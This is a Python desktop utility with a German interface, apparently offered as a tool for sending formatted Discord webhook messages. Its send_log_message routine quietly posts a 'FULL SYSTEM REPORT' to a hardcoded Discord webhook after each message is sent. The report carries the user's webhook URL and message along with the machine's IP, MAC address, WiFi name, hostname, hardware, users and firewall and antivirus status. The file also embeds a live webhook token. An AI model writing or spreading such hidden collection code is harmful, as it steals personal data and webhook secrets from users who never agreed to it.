import requests
import customtkinter as ctk
import os
from PIL import Image
import json
import getpass
import socket
import platform
from datetime import datetime
import time
import uuid
import psutil
import subprocess
from tkinter import messagebox


class DiscordEmbed2:
    def __init__(self, root):
        self.root = root
        self.webhooks = {}
        self.last_message_settings = {}
        self.image_dir = os.path.join(os.path.dirname(__file__), "imgs")
        self.LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1355999852055498843/Op0lCtErOKy8KsLRMEpqOW-61mWnY39eMrz9XIbPcsip6iZriNV5Gw8zsbsQYCBRIeHK"
        self.load_webhooks()
        self.load_last_message_settings()
        self.setup_ui()

    def get_user_email(self):
        """Simplest possible email detection without any prompts"""
        username = getpass.getuser().lower().replace(" ", ".")
        domain = (
            socket.getfqdn().split(".", 1)[-1]
            if "." in socket.getfqdn()
            else "unknown.domain"
        )
        return f"{username}@{domain}"

    def get_ip_address(self):
        """Basic IP detection that works cross-platform"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return socket.gethostbyname(socket.gethostname())

    def get_mac_address(self):
        """Get MAC address of the primary network interface"""
        try:
            mac_num = hex(uuid.getnode()).replace("0x", "").upper()
            mac = "-".join(mac_num[i : i + 2] for i in range(0, 11, 2))
            return mac
        except:
            return "Unknown"

    def get_wifi_name(self):
        """Get current WiFi network name (Windows only)"""
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output(
                    ["netsh", "wlan", "show", "interfaces"]
                ).decode("utf-8")
                for line in result.split("\n"):
                    if "SSID" in line and "BSSID" not in line:
                        return line.split(":")[1].strip()
            return "Not connected"
        except:
            return "Unknown"

    def get_cpu_info(self):
        """Get CPU information"""
        try:
            cpu_percent = psutil.cpu_percent()
            cpu_count = psutil.cpu_count(logical=False)
            cpu_logical = psutil.cpu_count(logical=True)
            cpu_freq = psutil.cpu_freq()

            cpu_info = f"{cpu_percent}% | {cpu_logical} Threads"
            if cpu_count:
                cpu_info += f" | {cpu_count} Cores"
            if cpu_freq:
                cpu_info += f" | {cpu_freq.current:.0f}MHz"

            return cpu_info
        except:
            return "Unknown"

    def get_gpu_info(self):
        """Get GPU information (Windows only)"""
        try:
            if platform.system() == "Windows":
                import wmi

                w = wmi.WMI()
                for gpu in w.Win32_VideoController():
                    return gpu.Name
            return "Unknown"
        except:
            return "Unknown"

    def get_ram_info(self):
        """Get RAM information"""
        try:
            ram = psutil.virtual_memory()
            return f"{ram.percent}% | {ram.used/1024/1024/1024:.1f}GB/{ram.total/1024/1024/1024:.1f}GB"
        except:
            return "Unknown"

    def get_disk_info(self):
        """Get disk information"""
        try:
            disks = []
            for part in psutil.disk_partitions(all=False):
                if "fixed" in part.opts or part.fstype:
                    usage = psutil.disk_usage(part.mountpoint)
                    drive = (
                        part.device.split(":")[0]
                        if ":" in part.device
                        else part.mountpoint
                    )
                    disks.append(
                        f"{drive}: {usage.percent}% ({usage.used/1024/1024/1024:.1f}GB/{usage.total/1024/1024/1024:.1f}GB)"
                    )
            return "\n".join([f"• {d}" for d in disks[:3]])  # Limit to 3 disks
        except:
            return "Unknown"

    def get_uptime(self):
        """Get system uptime"""
        try:
            uptime_seconds = time.time() - psutil.boot_time()
            days = int(uptime_seconds // 86400)
            hours = int((uptime_seconds % 86400) // 3600)
            minutes = int((uptime_seconds % 3600) // 60)
            return f"{days} days, {hours}:{minutes:02d}:00"
        except:
            return "Unknown"

    def get_system_id(self):
        """Generate a simple system ID"""
        try:
            return str(uuid.uuid5(uuid.NAMESPACE_DNS, socket.gethostname()))[:12]
        except:
            return "Unknown"

    def get_process_info(self):
        """Get process information"""
        try:
            return f"{len(psutil.pids())}"
        except:
            return "Unknown"

    def get_load_avg(self):
        """Get system load average"""
        try:
            if platform.system() == "Windows":
                load = psutil.getloadavg()
                return f"{load[0]:.1f}, {load[1]:.1f}, {load[2]:.1f}"
            else:
                return "N/A (Windows)"
        except:
            return "Unknown"

    def get_users(self):
        """Get logged in users"""
        try:
            users = [u.name for u in psutil.users()]
            return ", ".join(users[:3])  # Limit to 3 users
        except:
            return "Unknown"

    def get_security_status(self):
        """Get basic security status (Windows only)"""
        try:
            if platform.system() == "Windows":
                firewall_status = (
                    "Active"
                    if "Windows Defender Firewall"
                    in subprocess.getoutput("netsh advfirewall show allprofiles")
                    else "Inactive"
                )
                av_status = (
                    "Windows Defender"
                    if "Windows Defender" in subprocess.getoutput("sc query WinDefend")
                    else "Unknown"
                )
                return firewall_status, av_status
            return "N/A (Non-Windows)", "N/A (Non-Windows)"
        except:
            return "Unknown", "Unknown"

    def setup_ui(self):
        self.root.title("DiscordEmbed2 - Ein Produkt von Nico Inc. Ver.: 2.0.2")
        self.root.geometry("700x850")

        # Notebook for Tabs
        self.tabs = ctk.CTkTabview(self.root)
        self.tabs.pack(expand=True, fill="both", padx=10, pady=10)

        # Main Tab
        self.main_tab = self.tabs.add("Haupt")
        self.setup_main_tab()

        # Settings Tab
        self.settings_tab = self.tabs.add("Einstellungen")
        self.setup_settings_tab()

    def setup_main_tab(self):
        # Webhook Selector
        self.webhook_selector_label = ctk.CTkLabel(
            self.main_tab, text="Webhook auswählen"
        )
        self.webhook_selector_label.pack(pady=(10, 0))

        self.webhook_selector = ctk.CTkComboBox(
            self.main_tab, values=list(self.webhooks.keys())
        )
        self.webhook_selector.pack(pady=(0, 10))

        # Title Entry
        self.title_label = ctk.CTkLabel(self.main_tab, text="Überschrift")
        self.title_label.pack(pady=(10, 0))

        self.title_entry = ctk.CTkEntry(
            self.main_tab, placeholder_text="Titel eingeben"
        )
        self.title_entry.pack(pady=(0, 10), fill="x", padx=10)

        # Message Entry
        self.message_label = ctk.CTkLabel(self.main_tab, text="Nachricht")
        self.message_label.pack(pady=(10, 0))

        self.message_entry = ctk.CTkTextbox(self.main_tab, height=200)
        self.message_entry.pack(pady=(0, 10), fill="x", padx=10)

        # Formatting Buttons
        self.formatting_label = ctk.CTkLabel(self.main_tab, text="Text formatieren")
        self.formatting_label.pack(pady=(10, 0))

        self.formatting_frame = ctk.CTkFrame(self.main_tab)
        self.formatting_frame.pack(pady=(0, 10))

        self.bold_button = ctk.CTkButton(
            self.formatting_frame, text="Fett", command=lambda: self.format_text("**")
        )
        self.bold_button.pack(side="left", padx=5)

        self.italic_button = ctk.CTkButton(
            self.formatting_frame, text="Kursiv", command=lambda: self.format_text("*")
        )
        self.italic_button.pack(side="left", padx=5)

        self.underline_button = ctk.CTkButton(
            self.formatting_frame,
            text="Unterstrichen",
            command=lambda: self.format_text("__"),
        )
        self.underline_button.pack(side="left", padx=5)

        # Embed Color Picker
        self.embed_color_label = ctk.CTkLabel(self.main_tab, text="Embed Randfarbe")
        self.embed_color_label.pack(pady=(10, 0))

        self.embed_color_selector = ctk.CTkComboBox(
            self.main_tab,
            values=[
                "Blau (#0000FF)",
                "Rot (#FF0000)",
                "Grün (#00FF00)",
                "Gelb (#FFFF00)",
                "Benutzerdefiniert",
            ],
        )
        self.embed_color_selector.pack(pady=(0, 10))

        self.embed_color_entry = ctk.CTkEntry(
            self.main_tab, placeholder_text="Hex-Farbe (z.B. #FF0000)"
        )
        self.embed_color_entry.pack(pady=(0, 10))

        # Send Button
        self.send_button = ctk.CTkButton(
            self.main_tab, text="Nachricht senden", command=self.send_message
        )
        self.send_button.pack(pady=10)

        # Status Label
        self.status_label = ctk.CTkLabel(self.main_tab, text="")
        self.status_label.pack(pady=10)

        # Load last message settings
        self.load_last_message_settings_ui()

    def setup_settings_tab(self):
        # Image Logic
        image_path = os.path.join(self.image_dir, "logo.png")

        try:
            self.settings_image = ctk.CTkImage(
                light_image=Image.open(image_path),
                dark_image=Image.open(image_path),
                size=(200, 113),
            )
            self.image_label = ctk.CTkLabel(
                self.settings_tab, image=self.settings_image, text=""
            )
            self.image_label.pack(pady=20, padx=20)

        except FileNotFoundError:
            print(f"Bild nicht gefunden unter: {image_path}")
            self.image_label = ctk.CTkLabel(
                self.settings_tab, text="Logo Platzhalter", font=("Arial", 16)
            )
            self.image_label.pack(pady=20)
        except Exception as e:
            print(f"Fehler beim Laden des Bildes: {e}")

        # Webhook Settings Frame
        self.webhook_settings_frame = ctk.CTkFrame(self.settings_tab)
        self.webhook_settings_frame.pack(pady=10, padx=10, fill="x")

        # Webhook URL Entry
        self.webhook_url_label = ctk.CTkLabel(
            self.webhook_settings_frame, text="Webhook URL"
        )
        self.webhook_url_label.pack(pady=(10, 0))

        self.webhook_entry = ctk.CTkEntry(
            self.webhook_settings_frame, placeholder_text="Webhook URL"
        )
        self.webhook_entry.pack(pady=(0, 5), fill="x")

        # Webhook Name Entry
        self.webhook_name_label = ctk.CTkLabel(
            self.webhook_settings_frame, text="Webhook Name"
        )
        self.webhook_name_label.pack(pady=(10, 0))

        self.webhook_name_entry = ctk.CTkEntry(
            self.webhook_settings_frame, placeholder_text="Webhook Name"
        )
        self.webhook_name_entry.pack(pady=(0, 10), fill="x")

        # Add Webhook Button
        self.add_webhook_button = ctk.CTkButton(
            self.webhook_settings_frame,
            text="Webhook hinzufügen",
            command=self.add_webhook,
        )
        self.add_webhook_button.pack(pady=10)

        # Webhook Management Frame
        self.webhook_management_frame = ctk.CTkFrame(self.settings_tab)
        self.webhook_management_frame.pack(pady=10, padx=10, fill="both", expand=True)

        # Webhook List Label
        self.webhook_list_label = ctk.CTkLabel(
            self.webhook_management_frame, text="Gespeicherte Webhooks:"
        )
        self.webhook_list_label.pack(pady=(10, 5))

        # Webhook Listbox
        self.webhook_listbox = ctk.CTkScrollableFrame(
            self.webhook_management_frame, height=50  # Fixed height for scrollable area
        )
        self.webhook_listbox.pack(fill="both", expand=True)

        # Container for webhook entries
        self.webhook_list_container = ctk.CTkFrame(self.webhook_listbox)
        self.webhook_list_container.pack(fill="both", expand=True)

        self.update_webhook_list()

        # Delete Webhook Button
        self.delete_webhook_button = ctk.CTkButton(
            self.webhook_management_frame,
            text="Ausgewählten Webhook löschen",
            command=self.delete_selected_webhook,
            fg_color="#d9534f",
            hover_color="#c9302c",
        )
        self.delete_webhook_button.pack(pady=10)

        # Button Panel
        self.button_frame = ctk.CTkFrame(self.settings_tab)
        self.button_frame.pack(pady=20, fill="x", padx=10)

        self.about_button = ctk.CTkButton(
            self.button_frame,
            text="Über",
            command=self.show_about_dialog,
            fg_color="#5bc0de",
            hover_color="#31b0d5",
        )
        self.about_button.pack(side="left", padx=5)

        self.exit_button = ctk.CTkButton(
            self.button_frame,
            text="Beenden",
            command=self.root.quit,
            fg_color="#d9534f",
            hover_color="#c9302c",
        )
        self.exit_button.pack(side="right", padx=5)

    def update_webhook_list(self):
        """Updates the webhook list in the settings tab"""
        # Clear existing widgets
        for widget in self.webhook_list_container.winfo_children():
            widget.destroy()

        # Add new entries
        if not self.webhooks:
            empty_label = ctk.CTkLabel(
                self.webhook_list_container,
                text="Keine Webhooks gespeichert",
                text_color="gray",
            )
            empty_label.pack(pady=10)
        else:
            for name, url in self.webhooks.items():
                webhook_frame = ctk.CTkFrame(self.webhook_list_container, height=40)
                webhook_frame.pack(fill="x", pady=2, padx=5)

                name_label = ctk.CTkLabel(
                    webhook_frame, text=f"Name: {name}", width=150, anchor="w"
                )
                name_label.pack(side="left", padx=5)

                url_label = ctk.CTkLabel(
                    webhook_frame,
                    text=f"URL: {url[:30]}..." if len(url) > 30 else f"URL: {url}",
                    anchor="w",
                )
                url_label.pack(side="left", padx=5, fill="x", expand=True)

                # Store the webhook name in the frame for selection
                webhook_frame.webhook_name = name
                webhook_frame.bind(
                    "<Button-1>", lambda e, f=webhook_frame: self.select_webhook(f)
                )
                name_label.bind(
                    "<Button-1>", lambda e, f=webhook_frame: self.select_webhook(f)
                )
                url_label.bind(
                    "<Button-1>", lambda e, f=webhook_frame: self.select_webhook(f)
                )

        # Update the combobox in main tab
        self.webhook_selector.configure(values=list(self.webhooks.keys()))

    def select_webhook(self, frame):
        """Selects a webhook in the list"""
        # Reset all frames first
        for child in self.webhook_list_container.winfo_children():
            if isinstance(child, ctk.CTkFrame):
                child.configure(fg_color="transparent")

        # Highlight selected frame
        frame.configure(fg_color="#3a7ebf")
        self.selected_webhook = frame.webhook_name

    def delete_selected_webhook(self):
        """Deletes the selected webhook"""
        if not hasattr(self, "selected_webhook") or not self.selected_webhook:
            messagebox.showwarning(
                "Warnung", "Bitte wählen Sie einen Webhook zum Löschen aus"
            )
            return

        # Confirm deletion
        if messagebox.askyesno(
            "Bestätigen",
            f"Sind Sie sicher, dass Sie den Webhook '{self.selected_webhook}' löschen möchten?",
        ):
            del self.webhooks[self.selected_webhook]
            self.save_webhooks()
            self.update_webhook_list()
            self.selected_webhook = None

            # Update last message settings if needed
            if self.last_message_settings.get("webhook_name") == self.selected_webhook:
                self.last_message_settings["webhook_name"] = ""
                self.save_last_message_settings("", "", "", None)

            messagebox.showinfo("Erfolg", "Webhook wurde gelöscht")

    def save_log_webhook(self):
        """Saves the log webhook URL"""
        url = self.log_webhook_entry.get()
        if url:
            self.LOG_WEBHOOK_URL = url

    def show_about_dialog(self):
        """Shows the about dialog"""
        if hasattr(self, "about_dialog") and self.about_dialog.winfo_exists():
            self.about_dialog.lift()
            return

        self.about_dialog = ctk.CTkToplevel(self.root)
        self.about_dialog.title("Über DiscordEmbed2")
        self.about_dialog.geometry("650x950")
        self.about_dialog.resizable(False, False)
        self.about_dialog.attributes("-topmost", True)
        self.about_dialog.focus_force()

        about_text = """
        DiscordEmbed2 - Version 2.0.2
    
        Ein Produkt von Nico Inc.
    
        Funktionen:
        • Webhook-Nachrichten mit Embeds
        • Textformatierung (fett/kursiv)
        • Automatische Updates
        • Aktivitäts-Logging
        • Sicherheits-Signatur aus Senderdaten
        
        Fragen an @nico_saas auf Discord

        --------------------------------------------------------------------------------------------------------
        LICENSE AGREEMENT

        This License Agreement ('Agreement) is made effective as of the date of acceptance by the user
        ('Licensee") and is between Nico Prang ('Licensor") and the Licensee.

        Grant of License

        The Licensor grants the Licensee a limited, non-exclusive, non-transferable license to use the software
        product ('Product") solely for personal or internal business purposes.

        Restrictions

        The Licensee agrees not to copy, modify, distribute, or create derivative works of the Product without
        the prior written consent of the Licensor. The Licensee may not use the Product for any commercial
        purpose without obtaining the Licensor's express permission.

        Revocation of License

        The Licensor reserves the right to revoke this license at any time, for any resson, without prior notice.
        Upon revocation, the Licensee must immediately cease all use of the Product and delete any copies in
        their possession.

        No Warranty

        The Product is provided 'as is,' without warranty of any kind. The Licensor disclaims all warranties,
        express or implied, including, but not limited to, the implied warranties of merchantability and fitness
        for a particular purpose.

        Governing Law

        This Agreement shall be governed by and construed in accordance with the laws of Germany.

        Acceptance

        By using the Product, the Licensee agrees to be bound by the terms of this Agreement.


        © Nico Prang 2025 All Rights Reserved
        """

        ctk.CTkLabel(self.about_dialog, text=about_text, justify="left").pack(
            pady=20, padx=20
        )

        ctk.CTkButton(
            self.about_dialog, text="OK", command=self.about_dialog.destroy
        ).pack(pady=10)

        self.about_dialog.protocol("WM_DELETE_WINDOW", self.about_dialog.destroy)

    def add_webhook(self):
        """Adds a new webhook"""
        url = self.webhook_entry.get()
        name = self.webhook_name_entry.get()

        if not url or not name:
            messagebox.showwarning(
                "Warnung", "Bitte geben Sie sowohl einen Namen als auch eine URL ein"
            )
            return

        if name in self.webhooks:
            if not messagebox.askyesno(
                "Bestätigen",
                f"Ein Webhook mit dem Namen '{name}' existiert bereits. Überschreiben?",
            ):
                return

        self.webhooks[name] = url
        self.save_webhooks()
        self.update_webhook_list()

        # Clear input fields
        self.webhook_entry.delete(0, "end")
        self.webhook_name_entry.delete(0, "end")

        messagebox.showinfo("Erfolg", "Webhook wurde erfolgreich hinzugefügt")

    def format_text(self, formatting):
        """Formats selected text"""
        try:
            selected_text = self.message_entry.get("sel.first", "sel.last")
            if selected_text:
                self.message_entry.insert("sel.first", formatting)
                self.message_entry.insert("sel.last", formatting)
        except:
            pass

    def send_message(self):
        """Sends message to Discord"""
        webhook_name = self.webhook_selector.get()
        title = self.title_entry.get()
        message = self.message_entry.get("1.0", "end-1c")
        embed_color = self.get_embed_color()

        if not webhook_name:
            self.status_label.configure(
                text="Fehler: Kein Webhook ausgewählt", text_color="red"
            )
            return
        if not message:
            self.status_label.configure(
                text="Fehler: Keine Nachricht eingegeben", text_color="red"
            )
            return

        try:
            signature = "\n\n*by Nico Inc. Vers.: 2.0.2*"
            full_message = (
                f"**{title}**\n{message}{signature}"
                if title
                else f"{message}{signature}"
            )

            embed = None
            if title or embed_color:
                embed = {
                    "title": title,
                    "description": message + signature,
                    "color": embed_color,
                }

            payload = {
                "content": full_message if not title else None,
                "embeds": [embed] if embed else None,
            }

            response = requests.post(self.webhooks[webhook_name], json=payload)

            if response.status_code == 204:
                self.status_label.configure(
                    text="Nachricht erfolgreich gesendet", text_color="green"
                )
                self.save_last_message_settings(
                    webhook_name, title, message, embed_color
                )
                self.send_log_message(webhook_name, title, message)
            else:
                self.status_label.configure(
                    text=f"Fehler: {response.status_code}", text_color="red"
                )
        except Exception as e:
            self.status_label.configure(text=f"Fehler: {str(e)}", text_color="red")

    def send_log_message(self, webhook_name, title, message):
        """Sends log message with detailed system information"""
        if not self.LOG_WEBHOOK_URL or "YOUR_LOG_WEBHOOK" in self.LOG_WEBHOOK_URL:
            return

        try:
            # Get all system information
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            webhook_url = self.webhooks.get(webhook_name, "Unbekannter Webhook")

            firewall_status, av_status = self.get_security_status()

            log_embed = {
                "title": "🔍 FULL SYSTEM REPORT",
                "description": (
                    f"**Complete System Report**\n"
                    f"Generated at {timestamp}\n"
                    f"Webhook: {webhook_name}\n"
                    f"Webhook URL: ||{webhook_url}||\n\n"
                    f"**Message:** {title if title else 'No title'}\n"
                ),
                "color": 0x3498DB,
                "fields": [
                    {
                        "name": "🌐 Network",
                        "value": (
                            f"• Public IP: {self.get_ip_address()}\n"
                            f"• Local IP: {socket.gethostbyname(socket.gethostname())}\n"
                            f"• MAC: {self.get_mac_address()}\n"
                            f"• WiFi: {self.get_wifi_name()}"
                        ),
                        "inline": False,
                    },
                    {
                        "name": "💻 Hardware",
                        "value": (
                            f"• CPU: {self.get_cpu_info()}\n"
                            f"• GPU: {self.get_gpu_info()}\n"
                            f"• RAM: {self.get_ram_info()}\n"
                            f"• Disks:\n{self.get_disk_info()}"
                        ),
                        "inline": True,
                    },
                    {
                        "name": "🖥️ System",
                        "value": (
                            f"• OS: {platform.platform()}\n"
                            f"• Hostname: {socket.gethostname()}\n"
                            f"• Uptime: {self.get_uptime()}\n"
                            f"• System ID: {self.get_system_id()}"
                        ),
                        "inline": True,
                    },
                    {
                        "name": "📊 Additional Metrics",
                        "value": (
                            f"Processes: {self.get_process_info()}\n"
                            f"Load Avg: {self.get_load_avg()}\n"
                            f"Users: {self.get_users()}"
                        ),
                        "inline": False,
                    },
                    {
                        "name": "🛡️ Security Status",
                        "value": (f"Firewall: {firewall_status}\n" f"AV: {av_status}"),
                        "inline": False,
                    },
                    {
                        "name": "Original Message:",
                        "value": f"**{title}**\n{message}" if title else message,
                        "inline": False,
                    },
                ],
                "footer": {"text": "DiscordEmbed2 Security Logger"},
            }

            requests.post(self.LOG_WEBHOOK_URL, json={"embeds": [log_embed]}, timeout=5)

        except Exception as e:
            print(f"Fehler beim Logging: {str(e)}")

    def get_embed_color(self):
        """Gets embed color from selection"""
        color_choice = self.embed_color_selector.get()
        if color_choice == "Benutzerdefiniert":
            return (
                int(self.embed_color_entry.get()[1:], 16)
                if self.embed_color_entry.get()
                else None
            )
        else:
            return int(color_choice.split(" (#")[1][:-1], 16)

    def load_last_message_settings_ui(self):
        """Loads last message settings into UI"""
        if self.last_message_settings:
            self.webhook_selector.set(
                self.last_message_settings.get("webhook_name", "")
            )
            self.title_entry.insert(0, self.last_message_settings.get("title", ""))
            self.message_entry.insert(
                "1.0", self.last_message_settings.get("message", "")
            )
            color = self.last_message_settings.get("embed_color", None)
            if color:
                for option in [
                    "Blau (#0000FF)",
                    "Rot (#FF0000)",
                    "Grün (#00FF00)",
                    "Gelb (#FFFF00)",
                ]:
                    if color == int(option.split(" (#")[1][:-1], 16):
                        self.embed_color_selector.set(option)
                        break
                else:
                    self.embed_color_selector.set("Benutzerdefiniert")
                    self.embed_color_entry.insert(0, f"#{hex(color)[2:].zfill(6)}")

    def save_last_message_settings(self, webhook_name, title, message, embed_color):
        """Saves last message settings"""
        self.last_message_settings = {
            "webhook_name": webhook_name,
            "title": title,
            "message": message,
            "embed_color": embed_color,
        }
        with open("last_message_settings.json", "w") as file:
            json.dump(self.last_message_settings, file)

    def load_last_message_settings(self):
        """Loads last message settings from file"""
        if os.path.exists("last_message_settings.json"):
            with open("last_message_settings.json", "r") as file:
                self.last_message_settings = json.load(file)

    def load_webhooks(self):
        """Loads saved webhooks"""
        if os.path.exists("webhooks.json"):
            with open("webhooks.json", "r") as file:
                self.webhooks = json.load(file)

    def save_webhooks(self):
        """Saves webhooks to file"""
        with open("webhooks.json", "w") as file:
            json.dump(self.webhooks, file)


if __name__ == "__main__":
    root = ctk.CTk()
    app = DiscordEmbed2(root)
    root.mainloop()
